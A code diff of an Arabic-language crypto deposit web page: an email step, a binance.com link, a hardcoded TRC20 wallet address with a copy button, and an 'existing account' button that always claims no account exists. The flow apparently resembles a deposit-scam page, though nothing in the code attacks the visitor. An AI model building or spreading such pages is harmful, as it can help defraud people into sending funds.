@@ -13,7 +13,7 @@
     <style>
         body { 
             font-family: 'Cairo', sans-serif; 
-            background-color: #000000; /* تم تغيير الخلفية هنا إلى اللون الأسود */
+            background-color: #0f0c1b; 
             color: #ffffff; 
             text-align: center; 
             padding: 40px 20px; 
@@ -138,7 +138,7 @@
             padding: 15px; 
             border: 2px dashed #6c5ce7; 
             border-radius: 8px; 
-            background-color: #ffffff; /* المربع الأبيض */
+            background-color: #ffffff; /* Murebba el abyad */
             text-align: center;
             box-shadow: 0 5px 15px rgba(255,255,255,0.05);
         }
@@ -150,14 +150,14 @@
             padding: 12px 10px; 
             text-align: center; 
             background: #f1f2f6; 
-            color: #2f3542; /* لون خط داكن متناسق مع الخلفية البيضاء */
+            color: #2f3542; 
             border: 1px solid #ced6e0; 
             border-radius: 6px; 
             font-size: 14px; 
             font-weight: bold;
             direction: ltr; 
-            white-space: normal; /* السماح بالتفاف النص */
-            word-break: break-all; /* كسر النص عند نهاية السطر لكي لا يختفي */
+            white-space: normal; 
+            word-break: break-all; 
             box-sizing: border-box;
             margin-top: 5px;
         }
@@ -199,9 +199,8 @@
                     <label for="username">البريد الإلكتروني</label>
                     <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
-                <!-- زر المتابعة باللون الأخضر الوامض والنابض مع الحجم المصلح 16px -->
-                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
                 
+                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
                 <img src="logo.png" alt="logo" class="bottom-logo">
@@ -209,17 +208,13 @@
 
             <!-- الخطوة الثانية: خيارات الإيداع -->
             <div id="step2" style="display: none; margin-top: 15px;">
-                
-                <!-- زر بايننس باللون الأخضر الوامض والنابض -->
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
                 </a>
 
-                <!-- المربع المحدث باللون الأبيض الكامل والخط المتناسق الداكن -->
                 <div class="manual-deposit-box">
                     <p style="font-size: 14px; margin-bottom: 10px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     
-                    <!-- تم استبدال حقل input بـ div ثابت يلتف تلقائياً لمنع الانزلاق والقطع -->
                     <div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
                     
                     <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 10px; background: #6c5ce7; color: #fff; border: none; border-radius: 6px; margin-top: 10px; font-weight: bold; cursor: pointer;">نسخ عنوان المحفظة</button>
@@ -227,5 +222,37 @@
             </div>
         </form>
     </div>
+
+    <!-- جافا سكريبت التفاعلي لعمل الأزرار والنسخ والخطوات -->
+    <script>
+        function goToStep2() {
+            var emailInput = document.getElementById('username');
+            if (emailInput.checkValidity() && emailInput.value !== "") {
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            } else {
+                alert('يرجى إدخال بريد إلكتروني صحيح أولاً.');
+            }
+        }
+
+        function alertNoAccount() {
+            alert('لا يوجد حساب مسجل مسبقاً بهذا البريد، يرجى إنشاء حساب جديد.');
+        }
+
+        function copyWalletAddress() {
+            var addressText = document.getElementById('cryptoAddress').innerText;
+            navigator.clipboard.writeText(addressText).then(function() {
+                alert('تم نسخ عنوان المحفظة بنجاح!');
+            }, function() {
+                var textarea = document.createElement("textarea");
+                textarea.value = addressText;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand("copy");
+                document.body.removeChild(textarea);
+                alert('تم نسخ عنوان المحفظة بنجاح!');
+            });
+        }
+    </script>
 </body>
 </html>
